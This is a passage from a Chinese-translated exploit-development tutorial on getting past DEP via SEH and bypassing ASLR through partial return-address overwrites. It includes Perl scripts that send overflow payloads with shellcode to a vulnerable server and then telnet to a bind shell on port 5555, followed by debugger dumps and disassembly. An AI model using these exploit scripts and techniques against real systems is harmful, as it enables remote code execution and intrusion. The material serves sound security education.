socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
my $payload = $junk.$disabledep.$nops1.$shellcode.$nops2.$jumpback."\n";
print SOCKET $payload."\n";
print "[+] Payload sent, ".length($payload)." bytes\n";
close SOCKET or die "close: $!";
system('telnet '.$host.' 5555');
（译注：显然这个exploit不会成功，因为它还是忘记了放置填充字节。）
利用SEH绕过DEP
在上边的两个例子中，两个exploit（DEP绕过技术）都是直接覆盖返回地址，但是如果覆盖SEH会怎么
样呢？
在基于 SEH的exploit中，是利用指向 pop/ pop/ ret指令的指针重定向执行流到 nseh域中的地址上，
这里放置了跳转代码（随后被执行），当DEP启用后，显然依然要覆盖seh结构，但是不能再用pop /pop
/ret的地址，而应该用pop reg/pop reg/pop esp/ret指令的地址，指令pop esp可以改变堆栈指针，ret
将执行流转移到nseh中的地址上。（现在不再用跳转指令，而是用关闭 NX例程的地址覆盖nseh，用指
向pop/pop/pop esp/ret指令的指针覆盖异常处理器，像这样的指令组合很难找到，pvefindaddr可以帮
助你找到拥有这种指令的地址。）
ASLR 保护
Windows Vista, 2008 server, and Windows 7 也构建了另一种保护技术，它使进程中的执行模块,dll,
栈,和堆的加载地址随机化(事实上，系统从256个基地址中随机的选出一个来用于加载系统映像，并随机
化每个线程的堆基址和栈基址)。这个技术就是ASLR(地址空间布局随机化)。
这些地址在每次系统启动的时候会改变，ASLR是被默认启用的(除了IE7)，非系统镜像也可以通过链接选
项/DYNAMICBASE(Visual Studio 2005 SP1以上的版本，VS2008都支持)启用这种保护。也可以手动更改
已编译库的 dynamicbase位，使其支持 ASLR技术(把PE头中的 DllCharacteristics设置成0x40 -可以
使用工具PE EXPLORER打开库，查看DllCharacteristics是否包含0x40就可以知道是否支持ASLR技术)。
有个注册表项可以为映像/应用程序启用ASLR：
编辑 HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ 并添 加键
“MoveImages” (DWORD)
可用的值：
0:禁止随机化映像基地址，总是使用PE头中指定的基地址。
-1:不管是否有IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标志，都随机化所有可重定位的映像。
另 外 一 个 值 ： 仅 随 机 化 有 重 定 位 信 息 的 并 且 PE 头 中 DllCharacteristics 包 含
IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标志的模块，这是系统默认的行为。
为了得到好的效果，ASLR应该和DEP一起使用(反之亦然)
因为ASLR，即使你在Vista上使用DLL中的地址构造了exploit，但这个exploit只在系统重启前有效，
因为重启后，由于随机技术的应用，你的跳转地址将不再有效。
已经出现了一些绕过ASLR的技术，在这里我将讨论两种技术---部分覆盖和使用没有启用ASLR模块中的
地址，我不打算讨论其他的技术，如：利用堆，猜测随机地址，暴力破解等等。
绕过ASLR:部分覆盖返回地址
这种技术在 2007年 3月的著名的动画光标漏洞(MS Advisory 935423)利用中得到了使用.这个漏洞是
Alex Sotirov 发现。下面的链接解释了这个漏洞如何被发现和攻击:http://archive.codebreakers-
journal.com/content/view/284/27/ – ani-notes.pdf –
http://www.phreedom.org/research/vulnerabilities/ani-header/和 Metasploit- Exploiting the
ANI vulnerability on Vista。
这个漏洞的 exploit第一次在 Vista上绕过了 ASLR保护(突破了ASLR 保护机制，也绕过/GS - 事实上，
由于ANI头是被读到一个结构里面，所以栈上并没有cookie:-)).
这项技术背后的想法是很妙的，ASLR只是随机了地址的一部分，如果你重启后观察加载的模块基地址，
你会注意到只有地址的高字节随机，当一个地址保存在内存中，例如：0x12345678,它像这样存储:
LOW HIGH
87 65 43 21
当启用了ASLR技术，只有“43”和“21”是随机。在某些情况下，这可能使黑客利用/触发执行任意代码。
想象一下，当你攻击一个允许覆盖栈中返回地址的漏洞，原来固定的返回地址被系统放在栈中，而如果启
用ASLR，被随机处理后的地址被放置在栈中，比方说返回地址是0x12345678(0x1234是被随机部分，5678
始终不变),如果我们可以在0×1234XXXX(1234是随机的，但嘿 - 操作系统已经把他们放在栈中了)空间
中找到有趣的代码(例如JMP ESP或其他有用的指令)。我们只需要在低字节所表示的地址范围内找到有趣
的指令并用这些指令的地址替换掉栈中的低字节。
让我们看下下面的例子：在调试器中打开notepad.exe(Vista Business, SP2, English)并查看加载模块
的基地址。
重启并执行相同的操作：
地址的两个高字节被随机化，所以当你需要使用这些模块的地址时，无论如何也不能直接使用这些地址，
因为它会在重启后改变。
再次对程序执行同样的操作：
重启后：
如你所见，我们应用程序的基地址也是变化的（因为它是使用 VC++2008 编译的，并且链接选项
/dynamicbase采用了默认设置）
ImmDbg的命令!ASLRdynamicbase可以显示受ASLR保护的模块：
在Vista（不开启HW DEP/NX）上不启用GS编译这个应用程序，我们早就知道，向这个程序发送508字节
的数据后，我们就可以覆盖返回地址了，使用调试器在 pr()函数上设置断点，在覆盖返回地址之前，我
们先找出类似0x011e1293的返回地址(0x011e是随机的，但1293在系统重启后也是一样的)。
使用下边的exploit攻击:
use strict;
use Socket;
my $junk = "A" x 508;
my $eipoverwrite = "BBBB";
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk.$eipoverwrite."\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
从寄存器和堆栈的状态可以看出应该是返回地址被溢出后的状态：
(f90.928): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0018e23a ebx=00000000 ecx=0018e032 edx=0018e200 esi=00000001 edi=011e3388
eip=42424242 esp=0018e030 ebp=41414141 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246
42424242 ?? ???
0:000> d ecx
0018e032 18 00 00 00 00 00 41 41-41 41 41 41 41 41 41 41 ......AAAAAAAAAA
0018e042 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e052 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e062 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e072 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e082 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e092 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e0a2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0:000> d edx
0018e200 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e210 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e220 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e230 41 41 41 41 42 42 42 42-0a 00 00 00 00 00 00 00 AAAABBBB........
0018e240 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e250 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e260 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e270 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:000> d esp
0018e030 0a 00 18 00 00 00 00 00-41 41 41 41 41 41 41 41 ........AAAAAAAA
0018e040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e080 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e090 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e0a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
正常情况下，当我们到了这里，我们可能会去找一个跳转到 edx的指令，并且用jmp edx或者push ebp/ret
等指令的地址覆盖返回地址（然后用某个向后的跳转指令跳到shellcode）。但如我们所知，由于ASLR，
我们不能直接覆盖返回地址了。我们现在唯一能做的就是在 0x011exxxx（被溢出之前的返回地址）地址
范围内试着找到一个jmp edx或push ebp/ret指令,然后只要覆盖保存在栈中的返回地址的低字，在这个
例子中没有这样的指令存在。
这里还有另外一个问题，即使有这样的指令存在，你也会注意到覆盖返回地址的低字也不行，因为会自动
添加一个字符串结束符，这样会把高字的一个字节也覆盖了...所以要想exploit成功，必须在 0x011e00xx
地址范围内找到类似jmp edx…的指令，这样就把我们的可选空间限制在从0x011e0000开始到0x011e00ff
的这255字节的地址空间中：（译注：下边的地址空间给错了）
011E1000 /$ 55 PUSH EBP
011E1001 |. 8BEC MOV EBP,ESP
011E1003 |. 81EC 08020000 SUB ESP,208
011E1009 |. A0 1421CD00 MOV AL,BYTE PTR DS:[CD2114]
011E100E |. 8885 08FEFFFF MOV BYTE PTR SS:[EBP-1F8],AL
011E1014 |. 68 F3010000 PUSH 1F3 ; /n = 1F3 (499.)
011E1019 |. 6A 00 PUSH 0 ; |c = 00
011E101B |. 8D8D 09FEFFFF LEA ECX,DWORD PTR SS:[EBP-1F7] ; |
011E1021 |. 51 PUSH ECX ; |s
011E1022 |. E8 C30A0000 CALL  ; \memset
011E1027 |. 83C4 0C ADD ESP,0C
011E102A |. 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]
011E102D |. 8995 04FEFFFF MOV DWORD PTR SS:[EBP-1FC],EDX
011E1033 |. 8D85 08FEFFFF LEA EAX,DWORD PTR SS:[EBP-1F8]
011E1039 |. 8985 00FEFFFF MOV DWORD PTR SS:[EBP-200],EAX
011E103F |. 8B8D 00FEFFFF MOV ECX,DWORD PTR SS:[EBP-200]
011E1045 |. 898D FCFDFFFF MOV DWORD PTR SS:[EBP-204],ECX
011E104B |> 8B95 04FEFFFF /MOV EDX,DWORD PTR SS:[EBP-1FC]
011E1051 |. 8A02 |MOV AL,BYTE PTR DS:[EDX]
011E1053 |. 8885 FBFDFFFF |MOV BYTE PTR SS:[EBP-205],AL
011E1059 |. 8B8D 00FEFFFF |MOV ECX,DWORD PTR SS:[EBP-200]
011E105F |. 8A95 FBFDFFFF |MOV DL,BYTE PTR SS:[EBP-205]
011E1065 |. 8811 |MOV BYTE PTR DS:[ECX],DL
011E1067 |. 8B85 04FEFFFF |MOV EAX,DWORD PTR SS:[EBP-1FC]
011E106D |. 83C0 01 |ADD EAX,1
011E1070 |. 8985 04FEFFFF |MOV DWORD PTR SS:[EBP-1FC],EAX
011E1076 |. 8B8D 00FEFFFF |MOV ECX,DWORD PTR SS:[EBP-200]
011E107C |. 83C1 01 |ADD ECX,1
011E107F |. 898D 00FEFFFF |MOV DWORD PTR SS:[EBP-200],ECX
011E1085 |. 80BD FBFDFFFF >|CMP BYTE PTR SS:[EBP-205],0
011E108C |.^75 BD \JNZ SHORT vulnsrv.011E104B
011E108E |. 8BE5 MOV ESP,EBP
011E1090 |. 5D POP EBP
011E1091 \. C3 RETN
011E1092 CC INT3
011E1093 CC INT3
011E1094 CC INT3
011E1095 CC INT3
011E1096 CC INT3
011E1097 CC INT3
011E1098 CC INT3
011E1099 CC INT3
011E109A CC INT3
011E109B CC INT3
011E109C CC INT3
011E109D CC INT3
011E109E CC INT3
011E109F CC INT3
011E10A0 /$ 55 PUSH EBP
011E10A1 |. 8BEC MOV EBP,ESP
011E10A3 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]
011E10A6 |. 50 PUSH EAX ; /
011E10A7 |. 68 1821CD00 PUSH vulnsrv.011E2118 ; |format = "Error %s"
011E10AC |. FF15 A020CD00 CALL DWORD PTR DS:[] ; \printf
011E10B2 |. 83C4 08 ADD ESP,8
011E10B5 |. E8 FA090000 CALL  ; [WSACleanup
011E10BA |. 5D POP EBP
011E10BB \. C3 RETN